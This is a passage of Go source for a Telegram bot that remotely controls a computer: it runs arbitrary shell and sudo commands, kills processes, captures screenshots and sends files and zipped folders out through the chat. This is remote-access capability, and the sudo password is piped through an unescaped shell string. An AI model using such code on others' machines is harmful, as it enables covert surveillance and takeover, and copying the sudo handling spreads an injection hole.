			return exec.Command("plasma-apply-wallpaperimage", imagePath).Run()
		default:
			return exec.Command("feh", "--bg-scale", imagePath).Run()
	}
}

type ProcessInfo struct {
	Name     string
	Count    int
	PIDs     []int32
	MemUsage float64
	CPUPercent float64
}

func ListProcesses() []string {
	processes, err := process.Processes()
	if err != nil {
		return []string{fmt.Sprintf("Error: %v", err)}
	}

	processMap := make(map[string]*ProcessInfo)
	for _, p := range processes {
		name, _ := p.Name()
		mem, _ := p.MemoryInfo()
		memMB := float64(0)
		if mem != nil {
			memMB = float64(mem.RSS) / 1024 / 1024
		}
		cpuPercent, _ := p.CPUPercent()

		if info, ok := processMap[name]; ok {
			info.Count++
			info.PIDs = append(info.PIDs, p.Pid)
			info.MemUsage += memMB
			info.CPUPercent += cpuPercent
		} else {
			processMap[name] = &ProcessInfo{Name: name, Count: 1, PIDs: []int32{p.Pid}, MemUsage: memMB, CPUPercent: cpuPercent}
		}
	}

	var processList []*ProcessInfo
	for _, info := range processMap {
		processList = append(processList, info)
	}

	sort.Slice(processList, func(i, j int) bool {
		return processList[i].MemUsage > processList[j].MemUsage
	})

	var builder strings.Builder
	builder.WriteString("```text\n")
	builder.WriteString(fmt.Sprintf("%-30s %5s %10s %10s %s\n", "Name", "Cnt", "Mem(MB)", "CPU(%)", "PIDs"))
	for _, info := range processList {
		pidsStr := fmt.Sprint(info.PIDs)
		if len(info.PIDs) > 3 {
			pidsStr = fmt.Sprintf("%v +%d", info.PIDs[:3], len(info.PIDs)-3)
		}
		builder.WriteString(fmt.Sprintf("%-30s %5d %10.1f %10.1f %s\n", truncateString(info.Name, 30), info.Count, info.MemUsage, info.CPUPercent, pidsStr))
	}
	builder.WriteString("```")

	return splitMessage(builder.String(), 4000)
}

func ListTopProcesses(topN int) []string {
	processes, err := process.Processes()
	if err != nil {
		return []string{fmt.Sprintf("Error: %v", err)}
	}

	var processList []*ProcessInfo
	for _, p := range processes {
		name, _ := p.Name()
		mem, _ := p.MemoryInfo()
		memMB := float64(0)
		if mem != nil {
			memMB = float64(mem.RSS) / 1024 / 1024
		}
		cpuPercent, _ := p.CPUPercent()

		processList = append(processList, &ProcessInfo{Name: name, Count: 1, PIDs: []int32{p.Pid}, MemUsage: memMB, CPUPercent: cpuPercent})
	}

	sort.Slice(processList, func(i, j int) bool {
		return processList[i].CPUPercent > processList[j].CPUPercent // Сортировка по CPU
	})

	if len(processList) > topN {
		processList = processList[:topN]
	}

	var builder strings.Builder
	builder.WriteString("```text\n")
	builder.WriteString(fmt.Sprintf("%-30s %10s %10s %s\n", "Name", "Mem(MB)", "CPU(%)", "PID"))
	for _, info := range processList {
		builder.WriteString(fmt.Sprintf("%-30s %10.1f %10.1f %d\n", truncateString(info.Name, 30), info.MemUsage, info.CPUPercent, info.PIDs[0]))
	}
	builder.WriteString("```")

	return splitMessage(builder.String(), 4000)
}

func KillProcessByName(name string) string {
	processes, err := process.Processes()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}

	killed := 0
	var errs []string
	for _, p := range processes {
		pname, _ := p.Name()
		if strings.Contains(strings.ToLower(pname), strings.ToLower(name)) {
			if err := p.Kill(); err != nil {
				errs = append(errs, fmt.Sprint(p.Pid, ": ", err))
			} else {
				killed++
			}
		}
	}

	result := fmt.Sprintf("Killed %d processes named %s", killed, name)
	if len(errs) > 0 {
		result += "\nErrors: " + strings.Join(errs, "\n")
	}
	return result
}

func truncateString(s string, max int) string {
	if len(s) > max {
		return s[:max-3] + "..."
	}
	return s
}

func splitMessage(text string, maxLen int) []string {
	var parts []string
	for len(text) > maxLen {
		part := text[:maxLen]
		lastSpace := strings.LastIndex(part, " ")
		if lastSpace > 0 {
			part = part[:lastSpace]
		}
		parts = append(parts, part)
		text = text[len(part):]
	}
	parts = append(parts, text)
	return parts
}

func getCurrentDirContents() (string, error) {
	files, err := os.ReadDir(currentDir)
	if err != nil {
		return "", err
	}

	var builder strings.Builder
	builder.WriteString(fmt.Sprintf(tr("pwd_content"), escapeMarkdownV2(currentDir), ""))

	for _, file := range files {
		info, _ := file.Info()
		size := info.Size()
		sizeStr := fmt.Sprintf("%dB", size)
		if size > 1024*1024 {
			sizeStr = fmt.Sprintf("%.1fMB", float64(size)/1024/1024)
		} else if size > 1024 {
			sizeStr = fmt.Sprintf("%.1fKB", float64(size)/1024)
		}

		fileName := escapeMarkdownV2(file.Name())
		if file.IsDir() {
			builder.WriteString(fmt.Sprintf("📁 %s/ (%s)\n", fileName, sizeStr))
		} else {
			builder.WriteString(fmt.Sprintf("📄 %s (%s)\n", fileName, sizeStr))
		}
	}

	return builder.String(), nil
}

func changeDirectory(newDir string) (string, error) {
	if newDir == "~" {
		newDir, _ = os.UserHomeDir()
	}
	target := newDir
	if !filepath.IsAbs(newDir) {
		target = filepath.Join(currentDir, newDir)
	}
	if _, err := os.Stat(target); err != nil {
		return "", err
	}
	currentDir = target
	return currentDir, nil
}

func changeToParentDirectory() (string, error) {
	parent := filepath.Dir(currentDir)
	if parent == currentDir {
		return "Already at root", nil
	}
	currentDir = parent
	return fmt.Sprintf(tr("cd_success"), currentDir), nil
}

func executeCommand(cmd string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if strings.HasPrefix(cmd, "sudo ") && sudoPassword != "" {
		sudoCmd := fmt.Sprintf("echo '%s' | sudo -S %s", sudoPassword, strings.TrimPrefix(cmd, "sudo "))
		out, err := exec.CommandContext(ctx, "sh", "-c", sudoCmd).CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Error: %v\n%s", err, out)
		}
		return string(out)
	} else if strings.HasPrefix(cmd, "sudo ") {
		return "Set sudo password first with /sudo_pass"
	}

	out, err := exec.CommandContext(ctx, "sh", "-c", cmd).CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, out)
	}
	return string(out)
}

func sendFile(chatID int64, filePath string) {
	info, err := os.Stat(filePath)
	if err != nil {
		sendMessage(chatID, "File not found")
		return
	}

	if info.IsDir() || info.Size() > maxFileSize {
		sendLargeFile(chatID, filePath)
		return
	}

	doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(filePath))
	bot.Send(doc)
}

func sendLargeFile(chatID int64, path string) {
	zipPath := path + ".zip"
	err := createZipArchive(path, zipPath)
	if err != nil {
		sendMessage(chatID, "Zip error: "+err.Error())
		return
	}
	defer os.Remove(zipPath)

	parts, err := splitFile(zipPath, chunkSize)
	if err != nil {
		sendMessage(chatID, "Split error: "+err.Error())
		return
	}
	defer cleanupParts(parts)

	for i, part := range parts {
		doc := tgbotapi.NewDocument(chatID, tgbotapi.FilePath(part))
		doc.Caption = fmt.Sprintf("Part %d", i+1)
		bot.Send(doc)
	}
}

func createZipArchive(source, target string) error {
	f, err := os.Create(target)
	if err != nil {
		return err
	}
	defer f.Close()

	w := zip.NewWriter(f)
	defer w.Close()

	return filepath.Walk(source, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = strings.TrimPrefix(p, filepath.Dir(source)+"/")
		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}
		writer, err := w.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			file, err := os.Open(p)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
		}
		return err
	})
}

func splitFile(source string, size int64) ([]string, error) {
	f, err := os.Open(source)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	info, _ := f.Stat()
	var parts []string
	for i := int64(0); i*size < info.Size(); i++ {
		partName := fmt.Sprintf("%s.part%d", source, i)
		pf, err := os.Create(partName)
		if err != nil {
			return nil, err
		}
		copySize := size
		if (i+1)*size > info.Size() {
			copySize = info.Size() - i*size
		}
		io.CopyN(pf, f, copySize)
		pf.Close()
		parts = append(parts, partName)
	}
	return parts, nil
}

func cleanupParts(parts []string) {
	for _, p := range parts {
		os.Remove(p)
	}
}

func sendMessage(chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, escapeMarkdownV2(text))
	msg.ParseMode = tgbotapi.ModeMarkdownV2
	bot.Send(msg)
}

func sendLogFile(chatID int64) {
	logPath := filepath.Join(os.TempDir(), LOG_FILE_NAME)
	sendFile(chatID, logPath)
}

func sendScreenshot(chatID int64) error {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return fmt.Errorf("no displays")
	}
	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return err
	}

	tempFile, err := os.CreateTemp("", "screenshot*.png")
	if err != nil {
		return err
	}
	defer os.Remove(tempFile.Name())

	png.Encode(tempFile, img)
	tempFile.Close()

	photo := tgbotapi.NewPhoto(chatID, tgbotapi.FilePath(tempFile.Name()))
	bot.Send(photo)
	return nil
}

func handleFileUpload(update tgbotapi.Update, targetDir string) {
	fileID := update.Message.Document.FileID
	file, err := bot.GetFile(tgbotapi.FileConfig{FileID: fileID})
	if err != nil {
		return
	}

	filePath := filepath.Join(targetDir, update.Message.Document.FileName)
	downloadFile(file.Link(bot.Token), filePath)
	sendMessage(update.Message.Chat.ID, fmt.Sprintf(tr("file_saved"), filePath))
}

func isAudioFile(filename string) bool {
	ext := strings.ToLower(filepath.Ext(filename))
	return ext == ".mp3" || ext == ".wav" || ext == ".ogg"
}

func handleAudioUpload(update tgbotapi.Update) {
	var fileID, fileName string

	if update.Message.Audio != nil {
		fileID = update.Message.Audio.FileID
		fileName = update.Message.Audio.FileName
	} else if update.Message.Voice != nil {
		fileID = update.Message.Voice.FileID
		fileName = "voice.ogg"
	} else if update.Message.Document != nil {
		fileID = update.Message.Document.FileID
		fileName = update.Message.Document.FileName
	}

	file, err := bot.GetFile(tgbotapi.FileConfig{FileID: fileID})
	if err != nil {
		return
	}

	tempDir := filepath.Join(os.TempDir(), "audio")
	os.MkdirAll(tempDir, 0755)

	filePath := filepath.Join(tempDir, fileName)
	downloadFile(file.Link(bot.Token), filePath)

	sendMessage(update.Message.Chat.ID, tr("audio_playing"))

	result, err := playAudio(filePath)
	if err != nil {
		sendMessage(update.Message.Chat.ID, fmt.Sprintf(tr("audio_error"), err))
	} else {
		sendMessage(update.Message.Chat.ID, result)
	}
	os.Remove(filePath)
}

func playAudio(filePath string) (string, error) {
	f, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	var streamer beep.StreamSeekCloser
	var format beep.Format

	ext := filepath.Ext(filePath)
	switch strings.ToLower(ext) {
		case ".mp3":
			streamer, format, err = mp3.Decode(f)
		case ".wav":
			streamer, format, err = wav.Decode(f)
		default:
			return "", fmt.Errorf("unsupported format")
	}
	if err != nil {
		return "", err
	}

	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))

	if audioControl != nil {
		speaker.Clear()
		audioStreamer.Close()
	}

	audioStreamer = streamer
	audioFormat = format
	audioControl = &beep.Ctrl{Streamer: streamer, Paused: false}
	speaker.Play(audioControl)

	return fmt.Sprintf(tr("audio_played"), filepath.Base(filePath)), nil
}

func downloadFile(url, path string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return err
}

func main() {
	initLogging()
	defer logFile.Close()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		os.Exit(0)
	}()

	for {
		if err := initBot(); err != nil {
			log.Printf("Init error: %v", err)
			time.Sleep(time.Minute)
			continue
		}
		handleBotCommands()
	}
}
